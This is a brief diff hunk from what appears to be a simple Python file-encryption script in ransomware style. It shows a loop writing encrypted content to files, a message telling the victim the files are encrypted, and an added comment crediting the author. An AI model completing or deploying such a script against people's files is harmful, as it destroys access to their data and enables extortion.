@@ -33,3 +33,5 @@ for file in files:
 		wf.write(enc_content)
 		
 print("Your files are encrypted!!\nKey to decrypt content is in thekey.key file")
+
+#made by cryptomafiaPB
